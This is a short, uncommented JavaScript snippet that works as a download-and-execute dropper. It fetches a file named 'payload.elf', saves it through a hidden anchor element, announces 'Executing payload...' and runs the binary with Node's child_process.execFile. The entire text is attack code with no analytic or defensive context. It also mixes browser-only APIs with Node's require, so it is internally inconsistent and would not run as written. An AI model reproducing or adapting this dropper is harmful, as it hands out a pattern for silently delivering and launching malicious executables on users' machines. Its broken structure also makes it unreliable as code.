fetch('payload.elf').then(response => response.blob()).then(blob => {
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.style.display = 'none';
    a.href = url;
    a.download = 'payload.elf';
    document.body.appendChild(a);
    a.click();
    window.URL.revokeObjectURL(url);
    alert('Download complete. Executing payload...');
    const process = require('child_process');
    process.execFile('payload.elf', (error, stdout, stderr) => {
        if (error) {
            console.error(`Error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.error(`Stderr: ${stderr}`);
            return;
        }
        console.log(`Stdout: ${stdout}`);
    });
});